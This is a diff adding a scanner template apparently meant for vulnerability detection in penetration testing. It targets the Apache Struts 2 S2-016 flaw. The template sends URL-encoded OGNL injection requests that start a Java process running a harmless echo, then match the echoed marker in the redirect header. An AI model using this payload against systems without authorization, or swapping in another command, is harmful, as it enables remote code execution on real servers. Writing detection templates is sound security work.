@@ -1,0 +1,26 @@
+id: local-struts2-s2-016-cmd-rce
+
+info:
+  name: Struts2 S2-016 Command Execution (CVE-2013-2251)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-016 RCE via redirect: prefix OGNL injection.
+    Executes echo command and matches output in Location response header.
+  tags: safe-poc,exploit,struts2,s2-016,cve,cve2013,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?redirect:%24%7B%23a%3D(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2016-rce%22%7D)).start()%2C%23b%3D%23a.waitFor()%2C%23c%3D%23a.getInputStream()%2C%23d%3Dnew+java.io.InputStreamReader(%23c)%2C%23e%3Dnew+java.io.BufferedReader(%23d)%2C%23f%3D%23e.readLine()%2C%23f%7D"
+      - "{{BaseURL}}/index.action?redirect:%24%7B%23a%3D(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2016-rce%22%7D)).start()%2C%23b%3D%23a.waitFor()%2C%23c%3D%23a.getInputStream()%2C%23d%3Dnew+java.io.InputStreamReader(%23c)%2C%23e%3Dnew+java.io.BufferedReader(%23d)%2C%23f%3D%23e.readLine()%2C%23f%7D"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "pentest-platform-s2016-rce"
+      - type: status
+        status:
+          - 302
